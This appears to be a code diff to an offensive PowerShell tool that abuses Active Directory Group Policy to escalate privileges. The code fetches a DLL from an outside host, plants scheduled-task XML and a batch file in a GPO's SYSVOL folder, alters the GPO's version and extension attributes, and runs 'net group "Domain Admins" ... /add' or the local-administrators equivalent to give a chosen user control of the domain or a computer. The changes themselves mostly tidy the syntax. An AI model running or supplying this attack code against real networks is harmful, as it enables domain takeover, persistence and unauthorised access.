@@ -103,10 +103,10 @@ if($Log){
     Start-Transcript -Path $Log
 }
 if(!($LoadDLL)){
-    iwr https://ownd.lol/NIdmxycw/Microsoft.ActiveDirectory.Management.dll -OutFile Microsoft.ActiveDirectory.Management.dll
+    Invoke-WebRequest https://ownd.lol/NIdmxycw/Microsoft.ActiveDirectory.Management.dll -OutFile Microsoft.ActiveDirectory.Management.dll
     Import-Module .\Microsoft.ActiveDirectory.Management.dll
-    $mod = (Get-Module | select Name -ExpandProperty Name | findstr /i activedirectory)
-    if(($mod.Contains("Microsoft.ActiveDirectory")) -eq "True"){
+    $mod = (Get-Module | Select-Object -ExpandProperty Name | Where-Object { $_ -like "*activedirectory*" })
+    if(($mod -contains "Microsoft.ActiveDirectory")){
         $null
     } else {
         $red+" ActiveDirectory module failed to load!"
@@ -114,8 +114,8 @@ if(!($LoadDLL)){
     }
 } elseif($LoadDLL) {
     Import-Module $LoadDLL -ErrorAction Stop
-    $mod = (Get-Module | select Name -ExpandProperty Name | findstr /i activedirectory)
-    if(($mod.Contains("Microsoft.ActiveDirectory")) -eq "True"){
+    $mod = (Get-Module | Select-Object -ExpandProperty Name | Where-Object { $_ -like "*activedirectory*" })
+    if(($mod -like "Microsoft.ActiveDirectory*")){
         $null
     } else {
         $red+" ActiveDirectory module failed to load!"
@@ -145,8 +145,8 @@ if(!($LoadDLL)){
     }
 
     # Checking for gPCMachineExtensionNames for the means of backup and restoration after execution #
-    if(Get-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name gPCMachineExtensionNames | Select-Object gPCMachineExtensionNames -ExpandProperty gPCMachineExtensionNames -ErrorAction SilentlyContinue){
-        $InitialExtensions = (Get-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name gPCMachineExtensionNames | Select-Object gPCMachineExtensionNames -ExpandProperty gPCMachineExtensionNames);
+    if(Get-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name gPCMachineExtensionNames | Select-Object -ExpandProperty gPCMachineExtensionNames -ErrorAction SilentlyContinue){
+        $InitialExtensions = (Get-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name gPCMachineExtensionNames | Select-Object -ExpandProperty gPCMachineExtensionNames);
     } else {
         $noext=1
     }
@@ -157,8 +157,8 @@ if(!($LoadDLL)){
     } else {
         $i = 0
         while($gotcha -ne "1"){
-            $dauser = (Get-ADGroupMember "Domain Admins" | Select-Object SamAccountName -ExpandProperty SamAccountName)[$i]
-            if(((net user $dauser /dom | findstr active)[29]) -eq "Y"){
+            $dauser = (Get-ADGroupMember "Domain Admins" | Select-Object -ExpandProperty SamAccountName)[$i]
+            if((Get-ADUser $dauser -Properties Enabled).Enabled -eq $true){
                 $gotcha++
             } else {
                 $i++
@@ -183,13 +183,13 @@ if(!($LoadDLL)){
     }
     elseif($validatesecondxml.StartsWith("<?xml version")){
         $green+" Second XML File is valid!."
-        $cont = "powershell -NoProfile -ExecutionPolicy Bypass -Command `"Start-Process powershell -Verb RunAs -ArgumentList `"(`$Task=Get-Content '\\dc-01.noteasy.local\sysvol\noteasy.local\Policies\{D552AC5B-CE07-4859-9B8D-1B6A6BE1ACDA}\Machine\Preferences\ScheduledTasks\wsadd.xml' -raw); Register-ScheduledTask -Xml `$Task -TaskName OWNED2`""
+        $cont = "powershell -NoProfile -ExecutionPolicy Bypass -Command `"Start-Process powershell -Verb RunAs -ArgumentList `"(`$Task=Get-Content '\\$domain\sysvol\noteasy.local\Policies\$GPOGUID\Machine\Preferences\ScheduledTasks\wsadd.xml' -raw); Register-ScheduledTask -Xml `$Task -TaskName OWNED2`""
         Set-Content -Path .\add.bat -Value $cont
         New-Item -ItemType File -Path "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\wsadd.xml" -Force 2>&1>$null
         Copy-Item $SecondTaskXMLPath "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\wsadd.xml" -Force 2>&1>$null
         Copy-Item add.bat "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\add.bat" -Force 2>&1>$null
         $green+" Created wsadd.xml and add.bat files in SYSVOL!"
-        $pwd = (Get-Location | Select-Object Path -ExpandProperty Path)
+        $pwd = (Get-Location | Select-Object -ExpandProperty Path)
         $boundary = (Get-Date).AddHours(24).ToString("s")
         if($SecondXMLCMD){
             $xmlfile = "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\wsadd.xml"
@@ -253,7 +253,7 @@ if(!($LoadDLL)){
         }
         }
         $dacommand = '/r net group "Domain Admins" '+$User+' /add /dom'
-        $pwd = (Get-Location | Select-Object Path -ExpandProperty Path)
+        $pwd = (Get-Location | Select-Object -ExpandProperty Path)
         $xmlfile = "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
         $encoding = 'ASCII'
         $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
@@ -280,7 +280,7 @@ if(!($LoadDLL)){
         }
         }
         $localcommand = '/r net localgroup Administrators '+$User+' /add'
-        $pwd = (Get-Location | Select-Object Path -ExpandProperty Path)
+        $pwd = (Get-Location | Select-Object -ExpandProperty Path)
         $xmlfile = "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
         $encoding = 'ASCII'
         $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
@@ -301,7 +301,7 @@ if(!($LoadDLL)){
         $green+" ScheduledTasks file modified to add $User to local administrators group on $Computer!"
     } else {
         if($SecondTaskXMLPath){
-            $pwd = (Get-Location | Select-Object Path -ExpandProperty Path)
+            $pwd = (Get-Location | Select-Object -ExpandProperty Path)
         $xmlfile = "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
         $encoding = 'ASCII'
         $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
@@ -322,12 +322,12 @@ if(!($LoadDLL)){
         $green+" ScheduledTasks file modified to run the add.bat file!."
         }
         if($PowerShell){
-            if(($PowerShell.StartSwith("-c "))){
+            if(($PowerShell.StartsWith("-c "))){
                 $PowerShell = $PowerShell.replace("-c ","")
-            } elseif(($PowerShell.StartSwith("-Command "))){
+            } elseif(($PowerShell.StartsWith("-Command "))){
                 $PowerShell = $PowerShell.replace("-Command ","")
         }
-        $pwd = (Get-Location | Select-Object Path -ExpandProperty Path)
+        $pwd = (Get-Location | Select-Object -ExpandProperty Path)
         $xmlfile = "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
         $encoding = 'ASCII'
         $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
@@ -350,12 +350,12 @@ if(!($LoadDLL)){
                     Set-Content -Encoding $encoding $xmlfile -Force
         $green+" ScheduledTasks file modified with the supplied powershell custom command!."
     } if($CMD){
-        if(($CMD.StartSwith("/c "))){
+        if(($CMD.StartsWith("/c "))){
             $CMD = $CMD.replace("/c ","")
-        } elseif(($CMD.StartSwith("/r "))){
+        } elseif(($CMD.StartsWith("/r "))){
             $CMD = $CMD.replace("/r ","")
         }
-        $pwd = (Get-Location | Select-Object Path -ExpandProperty Path)
+        $pwd = (Get-Location | Select-Object -ExpandProperty Path)
         $xmlfile = "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
         $encoding = 'ASCII'
         $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
@@ -395,13 +395,13 @@ if(!($LoadDLL)){
                 Set-Content -Encoding $encoding $gptIniFilePath -Force
         }
     }
-    $currentVersion = (Get-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name versionNumber | Select-Object versionNumber -ExpandProperty versionNumber)
+    $currentVersion = (Get-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name versionNumber | Select-Object -ExpandProperty versionNumber)
     $gray+" Current GPO AD versionNumber = $currentVersion"
     $gray+" Incrementing version by 1"
     $newVersionValue = $currentVersion+1
     # Incrementing the AD Machine policy by 1 to match the new SYSVOL policy number #
     Set-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name versionNumber -Value $newVersionValue
-    $currentVersion = (Get-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name versionNumber | Select-Object versionNumber -ExpandProperty versionNumber)
+    $currentVersion = (Get-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name versionNumber | Select-Object -ExpandProperty versionNumber)
     $gray+" GPO AD versionNumber = $currentVersion"
     if($noext -ne 1){
         $gray+" Current gPCMachineExtensionNames : $InitialExtensions"
@@ -411,7 +411,7 @@ if(!($LoadDLL)){
     # Modyfing the gPCMachineExtensionNames attribute of the policy # 
     $gray+" Adding Extensions to the attribute"
     Set-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name gPCmachineExtensionNames -Value $Ext$InitialExtensions
-    $FinalizedGPO = (Get-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name gPCMachineExtensionNames | Select-Object gPCMachineExtensionNames -ExpandProperty gPCMachineExtensionNames)
+    $FinalizedGPO = (Get-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name gPCMachineExtensionNames | Select-Object -ExpandProperty gPCMachineExtensionNames)
     if($FinalizedGPO.StartsWith("[{00000000")){
         $green+" Successfully written extensions to GPO!"
     } else {
@@ -424,7 +424,7 @@ if(!($LoadDLL)){
             $PercentCompleted = ($x/300*100)
             Write-Progress -Activity "Waiting for GPO update on the DC... WAIT UNTIL COMPLETION, DO NOT TURN OFF!" -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
             Start-Sleep -Seconds 10
-            if ((Get-ADGroupMember "Domain Admins" | findstr $User) -ne $null) {
+            if ((Get-ADGroupMember "Domain Admins" | Where-Object {$_.SamAccountName -like "*$User*"})) {
                 break
             }
         }
@@ -434,7 +434,7 @@ if(!($LoadDLL)){
             $PercentCompleted = ($x/300*100)
             Write-Progress -Activity "Waiting for GPO update on the DC... WAIT UNTIL COMPLETION, DO NOT TURN OFF!" -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
             Start-Sleep -Seconds 10
-            if ((Get-CimInstance -ClassName Win32_Group  -Filter 'SID = "S-1-5-32-544"' -ComputerName $Computer -ErrorAction SilentlyContinue | Get-CimAssociatedInstance -ResultClassName Win32_UserAccount | select Name -ExpandProperty Name | findstr $User) -ne $null) {
+            if ((Get-CimInstance -ClassName Win32_Group  -Filter 'SID = "S-1-5-32-544"' -ComputerName $Computer -ErrorAction SilentlyContinue | Get-CimAssociatedInstance -ResultClassName Win32_UserAccount | Select-Object -ExpandProperty Name | Where-Object {$_ -like "*$User*"})) {
                 break
             }}
         $green+" User added to the local admins group!"
@@ -443,21 +443,22 @@ if(!($LoadDLL)){
             $PercentCompleted = ($x/300*100)
             Write-Progress -Activity "Waiting for GPO update on the DC... WAIT UNTIL COMPLETION, DO NOT TURN OFF! (Press `"End`" to quit)" -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
             Start-Sleep -Seconds 10
-            if((($Host.UI.RawUI.ReadKey("IncludeKeyDown") | select VirtualKeyCode -ExpandProperty VirtualKeyCode) -eq "35")){
+            if(($Host.UI.RawUI.ReadKey("IncludeKeyDown").VirtualKeyCode -eq 35)){
                 break
             }
         }
     }elseif($SecondTaskXMLPath){
+        if(!$User){
+            $User = $env:USERNAME
+        }
         for ($x = 1; $x -le 86400; $x+=60){
             $PercentCompleted = ($x/86400*100)
             Write-Progress -Activity "Waiting for GPO update on the DC... WAIT UNTIL COMPLETION, DO NOT TURN OFF! (Press `"End`" to quit)" -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
-            Start-Sleep -Seconds 60
-            if ((Get-ADGroupMember "Domain Admins" | findstr $User) -ne $null) {
+            Start-Sleep -Seconds 10
+            if ((Get-ADGroupMember "Domain Admins" | Where-Object {$_.SamAccountName -like "*$User*"})) {
                 break
-            }elseif((($Host.UI.RawUI.ReadKey("IncludeKeyDown") | select VirtualKeyCode -ExpandProperty VirtualKeyCode) -eq "35")){
-                break
-            }             
-        }
+            }          
+        }   
     }
     $gray+" Reverting extensions back to what they were"
     # Reverting the gPCMachineExtensionNames #
